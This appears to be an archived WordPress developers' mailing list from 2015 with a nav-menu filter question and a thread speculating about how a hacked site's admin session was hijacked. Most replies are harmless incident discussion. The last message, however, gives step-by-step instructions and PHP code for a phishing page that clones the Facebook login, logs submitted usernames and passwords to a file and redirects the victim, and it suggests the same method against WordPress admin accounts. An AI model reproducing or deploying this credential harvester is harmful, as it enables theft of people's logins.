@@ -1,0 +1,345 @@
+From dragonfly at dragonflyeye.net  Wed Dec  2 18:45:06 2015
+From: dragonfly at dragonflyeye.net (Thomas Belknap)
+Date: Wed, 2 Dec 2015 13:45:06 -0500
+Subject: [wp-hackers] nav_menu_link_attributes filter adds ending slash
+Message-ID: <CAEamYWSLcOMS+ME++V7S29n=iEJRDwPP-4r5Fup1ev0XsxjisQ@mail.gmail.com>
+
+I'm using the nav_menu_link_attributes filter to change the behavior of a
+specific post type. The first thing I noticed was that, in contrast to what
+the documentation says on this, $item refers to the *menu* item, not to the
+object to which it is linked.
+
+But beyond that, it seems that despite the fact that I'm replacing the
+'href' attribute of the link, something somewhere is adding a trailing
+slash, which is messing up what I'm doing. Here's the code I'm using:
+
+function nav_menu_panel_item( $attrs, $item, $args ) {
+if( stristr($attrs['href'], 'hn_panel') ) :
+preg_match( '|([^/]+)/?$|', $attrs['href'], $target );
+$attrs['href'] = '#' . $target[0];
+$attrs['class'] = stristr( $attrs['class'], 'smoothscroll' ) ?
+$attrs['class'] : $attrs['class'] . ' smoothscroll';
+endif;
+return $attrs;
+}
+add_filter( 'nav_menu_link_attributes', array( &$this,
+'nav_menu_panel_item' ), 10, 3 );
+
+As you can see, the point is to convert the "hn_panel" post type menu items
+into on-page anchor navigation. But by adding the trailing slash, WP is
+preventing this function from working.
+
+Is there another filter that I'm missing? I've set the priority from 1 to
+100 and back to 10, but that doesn't seem to help.
+
+Thanks
+
+Tom Belknap
+Owner/Editor, DragonFlyEye.Net
+Freelance writer
+Join me:
+
+   - *Inbox:* http://dragonflyeye.net/subscribe
+   - *Web*: http://dragonflyeye.net/
+   - *Facebook*: https://www.facebook.com/DragonFlyEye.Net
+   - *Twitter*: https://twitter.com/dragonflyeye
+   - *Google*: https://plus.google.com/u/1/103251482414903117843/posts
+
+From david at wordshell.net  Fri Dec 11 00:03:46 2015
+From: david at wordshell.net (David Anderson)
+Date: Fri, 11 Dec 2015 00:03:46 +0000
+Subject: [wp-hackers] Viruses that look for open WordPress tabs in your
+	browser?
+Message-ID: <566A12E2.1060407@wordshell.net>
+
+Has anyone come across the following before? Or is it potentially a new 
+thing? (I've not read any such thing before).
+
+I'm examining a hacked WP site. The logs show that the site owner, the 
+sole admin, was logged in, and working on it in wp-admin in a normal 
+way, up until 02:52 on a certain day. Then absolutely nothing until 
+03:35. Then at 03:35, wham - a single GET followed by a load of POST 
+requests to the plugin editor, one for each plugin, inserting hacker 
+code. All from the admin's IP/browser (same user agent), and too close 
+together to be human (i.e. obviously scripted). It's all the same IP and 
+browser session, which is confirmed as the site owner's ISP.
+
+My inference from that is that the site owner, at 02:52, went to do 
+other things, leaving the browser tab open. They got infected with a 
+virus (or perhaps already were), and that virus hunted for open browser 
+sessions logged-in to wp-admin, and used those sessions to infect the WP 
+site.
+
+That's all technically do-able. But I've not previously heard of a virus 
+(the customer has a Mac, and was using Safari), that does this. Is this 
+a new thing?
+
+David
+
+-- 
+UpdraftPlus - best WordPress backups - http://updraftplus.com
+WordShell - WordPress fast from the CLI - http://wordshell.net
+
+
+From jdg at codesymphony.co  Fri Dec 11 13:08:58 2015
+From: jdg at codesymphony.co (J.D. Grimes)
+Date: Fri, 11 Dec 2015 08:08:58 -0500
+Subject: [wp-hackers] Viruses that look for open WordPress tabs in your
+	browser?
+In-Reply-To: <566A12E2.1060407@wordshell.net>
+References: <566A12E2.1060407@wordshell.net>
+Message-ID: <24E311EC-2D66-4ED6-BB0F-D110622F8007@codesymphony.co>
+
+I'm not an expert, but I've never heard of anything like that before. Isn't it possible that the connection was compromised and an attacker was listening in on the user, then stole their session and spoofed the user agent?
+
+-J.D.
+
+> On Dec 10, 2015, at 7:03 PM, David Anderson <david at wordshell.net> wrote:
+> 
+> Has anyone come across the following before? Or is it potentially a new thing? (I've not read any such thing before).
+> 
+> I'm examining a hacked WP site. The logs show that the site owner, the sole admin, was logged in, and working on it in wp-admin in a normal way, up until 02:52 on a certain day. Then absolutely nothing until 03:35. Then at 03:35, wham - a single GET followed by a load of POST requests to the plugin editor, one for each plugin, inserting hacker code. All from the admin's IP/browser (same user agent), and too close together to be human (i.e. obviously scripted). It's all the same IP and browser session, which is confirmed as the site owner's ISP.
+> 
+> My inference from that is that the site owner, at 02:52, went to do other things, leaving the browser tab open. They got infected with a virus (or perhaps already were), and that virus hunted for open browser sessions logged-in to wp-admin, and used those sessions to infect the WP site.
+> 
+> That's all technically do-able. But I've not previously heard of a virus (the customer has a Mac, and was using Safari), that does this. Is this a new thing?
+> 
+> David
+> 
+> -- 
+> UpdraftPlus - best WordPress backups - http://updraftplus.com
+> WordShell - WordPress fast from the CLI - http://wordshell.net
+> 
+> _______________________________________________
+> wp-hackers mailing list
+> wp-hackers at lists.automattic.com
+> http://lists.automattic.com/mailman/listinfo/wp-hackers
+
+
+From scott.a.herbert at googlemail.com  Fri Dec 11 13:45:05 2015
+From: scott.a.herbert at googlemail.com (Scott Herbert)
+Date: Fri, 11 Dec 2015 13:45:05 +0000
+Subject: [wp-hackers] Viruses that look for open WordPress tabs in your
+	browser?
+In-Reply-To: <24E311EC-2D66-4ED6-BB0F-D110622F8007@codesymphony.co>
+References: <566A12E2.1060407@wordshell.net>
+ <24E311EC-2D66-4ED6-BB0F-D110622F8007@codesymphony.co>
+Message-ID: <CAEmCSgnsbmDXuVPZtpmmHaVr=4gh5L2hTbaQyaMCNQ-SkBX8tg@mail.gmail.com>
+
+I think Zeus (who's source code was leaked online) did a similuar
+thing with banking sites but that was on a PC. OSX (iirc) makes it
+much harder to snag the browsers memory space, nothing is impossabul.
+
+On 11 December 2015 at 13:08, J.D. Grimes <jdg at codesymphony.co> wrote:
+> I'm not an expert, but I've never heard of anything like that before. Isn't it possible that the connection was compromised and an attacker was listening in on the user, then stole their session and spoofed the user agent?
+>
+> -J.D.
+>
+>> On Dec 10, 2015, at 7:03 PM, David Anderson <david at wordshell.net> wrote:
+>>
+>> Has anyone come across the following before? Or is it potentially a new thing? (I've not read any such thing before).
+>>
+>> I'm examining a hacked WP site. The logs show that the site owner, the sole admin, was logged in, and working on it in wp-admin in a normal way, up until 02:52 on a certain day. Then absolutely nothing until 03:35. Then at 03:35, wham - a single GET followed by a load of POST requests to the plugin editor, one for each plugin, inserting hacker code. All from the admin's IP/browser (same user agent), and too close together to be human (i.e. obviously scripted). It's all the same IP and browser session, which is confirmed as the site owner's ISP.
+>>
+>> My inference from that is that the site owner, at 02:52, went to do other things, leaving the browser tab open. They got infected with a virus (or perhaps already were), and that virus hunted for open browser sessions logged-in to wp-admin, and used those sessions to infect the WP site.
+>>
+>> That's all technically do-able. But I've not previously heard of a virus (the customer has a Mac, and was using Safari), that does this. Is this a new thing?
+>>
+>> David
+>>
+>> --
+>> UpdraftPlus - best WordPress backups - http://updraftplus.com
+>> WordShell - WordPress fast from the CLI - http://wordshell.net
+>>
+>> _______________________________________________
+>> wp-hackers mailing list
+>> wp-hackers at lists.automattic.com
+>> http://lists.automattic.com/mailman/listinfo/wp-hackers
+>
+> _______________________________________________
+> wp-hackers mailing list
+> wp-hackers at lists.automattic.com
+> http://lists.automattic.com/mailman/listinfo/wp-hackers
+
+
+
+-- 
+--
+Scott Herbert
+Web:  http://www.Scott-Herbert.com/
+Twitter: http://twitter.com/Scott_Herbert
+Linkedin: http://www.linkedin.com/in/scottaherbert
+
+From markandrewslade at gmail.com  Fri Dec 11 14:15:11 2015
+From: markandrewslade at gmail.com (Mark Slade)
+Date: Fri, 11 Dec 2015 09:15:11 -0500
+Subject: [wp-hackers] Viruses that look for open WordPress tabs in your
+	browser?
+In-Reply-To: <CAEmCSgnsbmDXuVPZtpmmHaVr=4gh5L2hTbaQyaMCNQ-SkBX8tg@mail.gmail.com>
+References: <566A12E2.1060407@wordshell.net>
+ <24E311EC-2D66-4ED6-BB0F-D110622F8007@codesymphony.co>
+ <CAEmCSgnsbmDXuVPZtpmmHaVr=4gh5L2hTbaQyaMCNQ-SkBX8tg@mail.gmail.com>
+Message-ID: <CAPdxqKkg-M7w04P3wGfxeJyVRidGE5FoUkNaCxOGvSKOVWaXHw@mail.gmail.com>
+
+I am aware of a few ways this could have gone:
+
+   - Compromised browser -- the victim's browser was compromised and
+   malicious code is driving their browser to perform the attacks.  The
+   browser automatically includes auth cookies and the attack succeeds.
+   - Compromised OS -- the victim's device was compromised through the OS
+   or some shady software they installed.  At this point the virus doesn't
+   need to peek into the browser's memory space, it just needs drive the
+   browser the way a regular user would -- simulating mouse clicks, etc.  WP
+   trusts the browser so anything done by the browser will be trusted as
+   well.  I'm not too familiar with this kind of attack so I'm not sure what
+   OSes have what protections against this kind of thing, but I wouldn't rule
+   it out.
+   - Compromised network -- the victim's auth cookie was intercepted and
+   the attacker just used that cookie from their own device to hijack the auth
+   session.  For this to be the case, the attacker would've also needed to
+   spoof the victim's IP since that's what was in the logs.  This is usually
+   harder to pull off, but if the attacker is on the same LAN as the victim
+   then it becomes a lot easier.  If the victim connects to WordPress over
+   plaintext HTTP then this attack would be extremely easy to execute and it
+   could appear to come from the same IP as the victim.
+
+Mark
+
+On Fri, Dec 11, 2015 at 8:45 AM, Scott Herbert <
+scott.a.herbert at googlemail.com> wrote:
+
+> I think Zeus (who's source code was leaked online) did a similuar
+> thing with banking sites but that was on a PC. OSX (iirc) makes it
+> much harder to snag the browsers memory space, nothing is impossabul.
+>
+> On 11 December 2015 at 13:08, J.D. Grimes <jdg at codesymphony.co> wrote:
+> > I'm not an expert, but I've never heard of anything like that before.
+> Isn't it possible that the connection was compromised and an attacker was
+> listening in on the user, then stole their session and spoofed the user
+> agent?
+> >
+> > -J.D.
+> >
+> >> On Dec 10, 2015, at 7:03 PM, David Anderson <david at wordshell.net>
+> wrote:
+> >>
+> >> Has anyone come across the following before? Or is it potentially a new
+> thing? (I've not read any such thing before).
+> >>
+> >> I'm examining a hacked WP site. The logs show that the site owner, the
+> sole admin, was logged in, and working on it in wp-admin in a normal way,
+> up until 02:52 on a certain day. Then absolutely nothing until 03:35. Then
+> at 03:35, wham - a single GET followed by a load of POST requests to the
+> plugin editor, one for each plugin, inserting hacker code. All from the
+> admin's IP/browser (same user agent), and too close together to be human
+> (i.e. obviously scripted). It's all the same IP and browser session, which
+> is confirmed as the site owner's ISP.
+> >>
+> >> My inference from that is that the site owner, at 02:52, went to do
+> other things, leaving the browser tab open. They got infected with a virus
+> (or perhaps already were), and that virus hunted for open browser sessions
+> logged-in to wp-admin, and used those sessions to infect the WP site.
+> >>
+> >> That's all technically do-able. But I've not previously heard of a
+> virus (the customer has a Mac, and was using Safari), that does this. Is
+> this a new thing?
+> >>
+> >> David
+> >>
+> >> --
+> >> UpdraftPlus - best WordPress backups - http://updraftplus.com
+> >> WordShell - WordPress fast from the CLI - http://wordshell.net
+> >>
+> >> _______________________________________________
+> >> wp-hackers mailing list
+> >> wp-hackers at lists.automattic.com
+> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
+> >
+> > _______________________________________________
+> > wp-hackers mailing list
+> > wp-hackers at lists.automattic.com
+> > http://lists.automattic.com/mailman/listinfo/wp-hackers
+>
+>
+>
+> --
+> --
+> Scott Herbert
+> Web:  http://www.Scott-Herbert.com/
+> Twitter: http://twitter.com/Scott_Herbert
+> Linkedin: http://www.linkedin.com/in/scottaherbert
+> _______________________________________________
+> wp-hackers mailing list
+> wp-hackers at lists.automattic.com
+> http://lists.automattic.com/mailman/listinfo/wp-hackers
+>
+
+From truthscribe722 at gmail.com  Fri Dec 11 14:26:54 2015
+From: truthscribe722 at gmail.com (DaveB722)
+Date: Fri, 11 Dec 2015 07:26:54 -0700 (MST)
+Subject: [wp-hackers] Viruses that look for open WordPress tabs in your
+	browser?
+In-Reply-To: <566A12E2.1060407@wordshell.net>
+References: <566A12E2.1060407@wordshell.net>
+Message-ID: <1449844014943-44847.post@n5.nabble.com>
+
+I don't know of anything in the wild for OS X that would execute this
+behavior. Sounds like either the site or the server was already compromised. 
+
+
+
+--
+View this message in context: http://wordpress-hackers.1065353.n5.nabble.com/Viruses-that-look-for-open-WordPress-tabs-in-your-browser-tp44842p44847.html
+Sent from the Wordpress Hackers mailing list archive at Nabble.com.
+
+From griffiths_j at hotmail.com  Tue Dec 15 02:19:07 2015
+From: griffiths_j at hotmail.com (J G)
+Date: Mon, 14 Dec 2015 18:19:07 -0800
+Subject: [wp-hackers] Viruses that look for open WordPress tabs in your
+ browser?
+In-Reply-To: <566A12E2.1060407@wordshell.net>
+References: <566A12E2.1060407@wordshell.net>
+Message-ID: <BAY180-W12791C661C57CFB7EBB3FB80EE0@phx.gbl>
+
+I know that I tested this on my own facebook account and it did work, it deals with GET and POST commands. Copy and past source from facebook.com login (frst page) and if changing action= to GET and save the manipulated source code as index.php and FTP to your own web server and save log.txt in same root folder with the log reading 
+<?phpheader("Location: http://www.facebook.com/home.php? ");$handle = fopen("passwords.txt", "a");foreach($_GET as $variable => $value) {fwrite($handle, $variable);fwrite($handle, "=");fwrite($handle, $value);fwrite($handle, "\r\n");}fwrite($handle, "\r\n");fclose($handle);exit;?>
+a new file would be created within the same folder as index.php, log.txt and it would display Username and Password. I imagine by doing this very similar phishing attack one could gain access to  an admim-wp account? Correct me please if I am on a completely different subject it just seemed familiar. This attack no longer works for facebook.
+> To: wp-hackers at lists.automattic.com
+> From: david at wordshell.net
+> Date: Fri, 11 Dec 2015 00:03:46 +0000
+> Subject: [wp-hackers] Viruses that look for open WordPress tabs in your	browser?
+> 
+> Has anyone come across the following before? Or is it potentially a new 
+> thing? (I've not read any such thing before).
+> 
+> I'm examining a hacked WP site. The logs show that the site owner, the 
+> sole admin, was logged in, and working on it in wp-admin in a normal 
+> way, up until 02:52 on a certain day. Then absolutely nothing until 
+> 03:35. Then at 03:35, wham - a single GET followed by a load of POST 
+> requests to the plugin editor, one for each plugin, inserting hacker 
+> code. All from the admin's IP/browser (same user agent), and too close 
+> together to be human (i.e. obviously scripted). It's all the same IP and 
+> browser session, which is confirmed as the site owner's ISP.
+> 
+> My inference from that is that the site owner, at 02:52, went to do 
+> other things, leaving the browser tab open. They got infected with a 
+> virus (or perhaps already were), and that virus hunted for open browser 
+> sessions logged-in to wp-admin, and used those sessions to infect the WP 
+> site.
+> 
+> That's all technically do-able. But I've not previously heard of a virus 
+> (the customer has a Mac, and was using Safari), that does this. Is this 
+> a new thing?
+> 
+> David
+> 
+> -- 
+> UpdraftPlus - best WordPress backups - http://updraftplus.com
+> WordShell - WordPress fast from the CLI - http://wordshell.net
+> 
+> _______________________________________________
+> wp-hackers mailing list
+> wp-hackers at lists.automattic.com
+> http://lists.automattic.com/mailman/listinfo/wp-hackers
+ 		 	   		  
+
